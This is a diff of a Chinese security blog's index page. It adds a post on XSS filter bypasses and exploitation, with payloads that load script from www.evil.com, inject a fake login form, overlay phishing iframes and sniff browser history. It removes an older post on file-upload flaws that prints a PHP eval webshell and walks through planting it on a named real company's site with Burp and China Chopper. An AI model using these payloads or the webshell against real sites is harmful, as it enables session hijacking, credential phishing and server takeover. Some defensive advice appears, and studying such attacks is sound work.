@@ -258,6 +258,239 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/24/XSS绕过和利用方式总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/24/XSS绕过和利用方式总结/" itemprop="url">
+                  XSS绕过和利用方式总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-24T22:02:17+08:00">
+                2018-04-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞利用/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞利用</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/24/XSS绕过和利用方式总结/" class="leancloud_visitors" data-flag-title="XSS绕过和利用方式总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-XSS"><a href="#0x00-XSS" class="headerlink" title="0x00 XSS"></a>0x00 XSS</h2><p>XSS，跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。比如获取用户Cookie，会话劫持，钓鱼欺骗等多种攻击。</p>
+<h2 id="0x01-绕过"><a href="#0x01-绕过" class="headerlink" title="0x01 绕过"></a>0x01 绕过</h2><p>实际的情况中，很多网站会对&lt;&gt;，script等关键词进行限制，也有的不允许在input中运行js脚本，这个时候，就需要去考虑怎么绕过。</p>
+<ul>
+<li>1 大小写混用</li>
+</ul>
+<p>首先是最简单的大小写混用，对一些仅仅匹配过滤的系统进行绕过，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRipt&gt;AleRt(&apos;xss&apos;)&lt;/ScRipt&gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>2 利用HTML标签属性值执行</li>
+</ul>
+<p>在某些系统中，用户不能自己构造html标签，这个时候可以使用html标签属性值调用js，比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=&quot;jacascript:alert(/xss/)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>3 回车空格等</li>
+</ul>
+<p>在有些系统中，xss Filter仅仅将敏感字符列入黑名单，可以通过空格，tab，回车来绕过限制，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas cript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>或者换行输入用分号分隔：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas</span><br><span class="line">cript:</span><br><span class="line">alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>4 对标签属性进行转码</li>
+</ul>
+<p>普通的标签属性值过滤还可以通过编码绕过，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以写成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>5 自己构造事件</li>
+</ul>
+<p>不能依靠属性值运行xss的时候，我们可以尝试通过html事件来实现xss，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;#&quot; onerror=alert(&apos;xss&apos;) &gt;</span><br></pre></td></tr></table></figure></p>
+<p>图片地址不存在，加载失败的时候就会运行后面的脚本</p>
+<p>也可以在别的位置使用：<br>onload加载完成时运行<br>oncheck点击时运行<br>onmousemove当鼠标移动时运行</p>
+<ul>
+<li>6 注释过滤</li>
+</ul>
+<p>在样式表中，/**/中间的内容会被浏览器忽略，在css中，我们可以使用expression执行js代码，这个时候遇到黑名单过滤，我们就可以通过添加无意义的注释符号来避开过滤。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;xss:expr/*xss*/ession(alert(&apos;xss&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>7 拆分跨站</li>
+</ul>
+<p>有的网站输入框对输入长度有所限制，无法构造出完整的xss代码，这个时候有一种十分巧妙的拆分法可供选择，如我们要输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&apos;&lt;script src=http://www.evil.com/hack.js&gt;&lt;/script&gt;&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>但是输入框限制每次只能输入30个字符时，我们可以：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;&lt;script&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;src=htt&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;p://www&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;.evil.c&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;om/hack&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;.js&gt;&lt;/s&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;cript&gt;&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;)&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;eval(z)&apos;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这样就成功将代码拼接在z中，再通过eval(z)执行代码。</p>
+<h2 id="0x03-cookie劫持"><a href="#0x03-cookie劫持" class="headerlink" title="0x03 cookie劫持"></a>0x03 cookie劫持</h2><p>cookie劫持在上一篇的跨站脚本攻击中已经详细演示过，具体方法就是通过用户点击链接访问页面，执行恶意xss代码然后将用户的浏览器cookie发送到我们自己的远程服务器，然后通过cookie来登陆。</p>
+<h2 id="0x04-xss钓鱼"><a href="#0x04-xss钓鱼" class="headerlink" title="0x04 xss钓鱼"></a>0x04 xss钓鱼</h2><p>xss钓鱼是xss最常用的利用方式，有很多种实现方式：</p>
+<ul>
+<li>xss重定向钓鱼</li>
+</ul>
+<p>我们在一个网页找到了xss漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.123.com/index.php?input=[Expliot]</span><br></pre></td></tr></table></figure></p>
+<p>构造如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.123.com/index.php?input=&lt;script&gt;document.location.href=&quot;http://www.hack.com&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>就可以通过xss重定向，将网页跳转到<a href="http://www.hack.com" target="_blank" rel="noopener">www.hack.com</a></p>
+<ul>
+<li>HTML注入式钓鱼</li>
+</ul>
+<p>仍然假设有如下漏洞页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.123.com/index.php?input=[Expliot]</span><br></pre></td></tr></table></figure></p>
+<p>然后我们在input里面写入一段html代码，就会在正常的网页中增添一个我们构造的登陆表单：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.hack.com/index.php?input=&quot;&apos;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;div style=&quot;text-align: center;&quot;&gt;&lt;form</span><br><span class="line">Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br/&gt;Login:&lt;br/&gt;</span><br><span class="line">&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>然后通过这个表单覆盖网页中的部分位置，就很容易引诱用户输入账号密码。</p>
+<ul>
+<li>iframe钓鱼</li>
+</ul>
+<p>iframe是HTML标签，作用是文档中的文档，或者浮动的框架(FRAME)。iframe元素会创建包含另外一个文档的内联框架。<br>我们先来看一个iframe的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;body&#123;</span><br><span class="line">      margin:0px;</span><br><span class="line">	  border:0px;</span><br><span class="line">	  padding:0px;</span><br><span class="line">  &#125;</span><br><span class="line">iframe&#123;border:0px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;iframe src=&quot;http://www.baidu.com/&quot; id=&quot;iframepage&quot; name=&quot;iframepage&quot;  width=&quot;100%&quot; height=&quot;100%&quot; &gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这样我们可以用百度页面覆盖整个网页。</p>
+<p>而xss-iframe钓鱼就是攻击者在有xss的网站中用iframe框架调用自己的黑页，覆盖整个页面或者登陆框，将数据传给自己。<br>我们可以先在自己的<a href="http://www.hack.com搭建好完全和对方相同的网页，并且在后台写好接收保存账号密码的php文件，然后将style和iframe写在xss中" target="_blank" rel="noopener">www.hack.com搭建好完全和对方相同的网页，并且在后台写好接收保存账号密码的php文件，然后将style和iframe写在xss中</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;body&#123;margin:0px;border:0px;padding:0px;&#125;</span><br><span class="line">iframe&#123;border:0px;&#125;</span><br><span class="line">&lt;iframe src=&quot;http://www.hack.com/&quot;width=&quot;100%&quot; height=&quot;100%&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
+<p>就会覆盖整个网页，并且将数据传给我们的网站。而且用户访问这个网站时url仍然是原本的url。</p>
+<h2 id="0x05-http-history-hack"><a href="#0x05-http-history-hack" class="headerlink" title="0x05 http history hack"></a>0x05 http history hack</h2><p>css中有个属性visited，可以设置访问过的链接样式，然后xss可以通过遍历检查css中的visited属性，来查看一个用户是否访问过某些网站。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt; script &gt;</span><br><span class="line">var websites = [要检测的访问过的网址列表（自己补充）];</span><br><span class="line">//遍历每个URL</span><br><span class="line">for (var i = 0; i &lt; websites.length: i++) &#123;</span><br><span class="line">    var link = document.createElement(&quot;a&quot;);</span><br><span class="line">    link.id = &quot;id&quot; + i;</span><br><span class="line">    link.href = websites[i];</span><br><span class="line">    link.innerHTML = websites[i];</span><br><span class="line">    document.write(&apos;&lt;style&gt;&apos;);</span><br><span class="line">    document.write(&apos;#id&apos; + i + &quot;:visited &#123;color:#FF0000;&#125;&quot;);</span><br><span class="line">    document.write(&apos;&lt;/style&gt;&apos;);</span><br><span class="line">    document.body.appendChild(link);</span><br><span class="line">    var color = document.defaultView.getComputedStyle(link, null).getPropertyValue(&quot;color&quot;);</span><br><span class="line">    document.body.removeChild(link);</span><br><span class="line">    if (color == &quot;rgb(255,0,0)&quot;) &#123; //visited</span><br><span class="line">        var item = document.createElement(&apos;li&apos;);</span><br><span class="line">        item.appendChild(link);</span><br><span class="line">        document.getElementById(&apos;visited&apos;).appendChild(item);</span><br><span class="line">    &#125; else &#123; //Not visited</span><br><span class="line">        var item = document.createElement(&apos;li&apos;);</span><br><span class="line">        item.appendChild(link);</span><br><span class="line">        document.getElementById(&apos;notvisited&apos;).appendChild(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; &lt; /script&gt;/</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x06-xss网页挂马"><a href="#0x06-xss网页挂马" class="headerlink" title="0x06 xss网页挂马"></a>0x06 xss网页挂马</h2><p>在存储型xss中，我们可以将自己的xss代码提交上去，然后链接我们的木马，这样每个访问有xss页面的人都会触发木马。</p>
+<h2 id="0x07-xss-Wrom"><a href="#0x07-xss-Wrom" class="headerlink" title="0x07 xss Wrom"></a>0x07 xss Wrom</h2><p>xss wrom即xss蠕虫，在一些存在存储型xss漏洞的大型社交网站，如果我们将xss代码的功能写成让访问到的人，在自己的主页里或其他有权限的页面提交一个一样的xss代码，这样浏览他的主页的人也会受到xss wrom影响继续写xss代码，这样就会很快传遍整个网络，危害极大。<br>而且xss蠕虫通常使用了大量的Ajax技术，即异步请求，无须刷新即可传输数据，隐蔽性高，传播速度极快。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/SSRF服务端请求伪造/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2130,210 +2363,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/29/文件上传漏洞/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/03/29/文件上传漏洞/" itemprop="url">
-                  文件上传漏洞
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-29T20:07:14+08:00">
-                2018-03-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞利用/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞利用</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/03/29/文件上传漏洞/" class="leancloud_visitors" data-flag-title="文件上传漏洞">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-什么是文件上传漏洞"><a href="#0x00-什么是文件上传漏洞" class="headerlink" title="0x00 什么是文件上传漏洞"></a>0x00 什么是文件上传漏洞</h2><p>在网站一些可以上传文件的地方，利用上传漏洞上传木马可以直接得到WEBSHELL，危害等级极高。</p>
-<h2 id="0x01-产生原因"><a href="#0x01-产生原因" class="headerlink" title="0x01 产生原因"></a>0x01 产生原因</h2><ul>
-<li>未过滤或本地过滤<br>未过滤指没有限制任何格式的文件上传，这个时侯入侵者上传php文件，就可以直接利用。<br>本地过滤是在前端进行过滤，实际上相当于没有任何限制，入侵者可以通过抓包更改文件名直接绕过前端检查。</li>
-<li>黑名单扩展名过滤<br>黑名单因为限制的扩展名不够完善，导致可以通过各种其他的扩展名绕过，比如大小写混用，或者同故宫其他同种意思的扩展名进行绕过。</li>
-<li>文件头绕过<br>如上传图片文件时，在文件头加上图片文件的文件头如“GIF89a”，则可以绕过检查。</li>
-<li>content-type绕过<br>content-type在http request的请求头里面，所以可以直接通过请求者抓包重发更改来绕过。</li>
-</ul>
-<h2 id="0x02-搭建环境"><a href="#0x02-搭建环境" class="headerlink" title="0x02 搭建环境"></a>0x02 搭建环境</h2><p>我们先尝试搭建一下文件上传漏洞的环境进行测试。<br>首先配置好lamp环境，然后在/var/www/html/test文件夹下，创建新的form.html文件，写入如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;php_upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后创建upload_file.php，写入如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; 文件已经存在。 &quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span><br><span class="line">    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">    echo &quot;文件存储在: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后我们在物理机中，写一个含有如下恶意代码的php文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&apos;a123456&apos;]) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后通过访问虚拟机中的网页，将文件上传</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_upload/fu01.png" alt=""></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_upload/fu02.png" alt=""></p>
-<p>接着在浏览器访问/test/upload路径，可以看到我们的恶意代码已经上传</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_upload/fu03.png" alt=""></p>
-<p>然后我们打开菜刀，将恶意代码的url和我们设置的密码写进去，进行连接，发现获取了目的服务器的权限，可以非常自由的访问所有路径，甚至进行写文件操作。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_upload/fu04.png" alt=""></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_upload/fu05.png" alt=""></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_upload/fu06.png" alt=""></p>
-<h2 id="0x03-实战"><a href="#0x03-实战" class="headerlink" title="0x03 实战"></a>0x03 实战</h2><p>接下来我们用某公司网页进行一个实战，目前该漏洞已被修复，请不要再尝试  </p>
-<p>在目的公司页面 <a href="http://asm.51welink.com" target="_blank" rel="noopener">http://asm.51welink.com</a> 注册账号登陆<br>登陆进去后发现可以上传证书，但是限制了zip格式  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_upload/fu07.png" alt=""></p>
-<p>同样我们写个和上面一样的php一句话木马，然后重命名成zip  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&apos;a123456&apos;]) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>通过burpsuite抓包上传的数据包，更改文件格式为php，上传  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_upload/fu08.png" alt=""></p>
-<p>用菜刀连接，获取网站webshell。</p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/file_upload/fu09.png" alt=""></p>
-<h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><ul>
-<li>1.应用白名单的方式过滤文件扩展名</li>
-<li>2.使用三等于（===）来对比扩展名（防止类型转换带来的逻辑漏洞，之后写逻辑漏洞的时候会写到）</li>
-<li>3.如果不是图片等必要呈现出来的文件，对上传路径设置权限。</li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2383,7 +2412,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">38</span>
+                <span class="site-state-item-count">39</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2405,7 +2434,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">36</span>
+                <span class="site-state-item-count">37</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
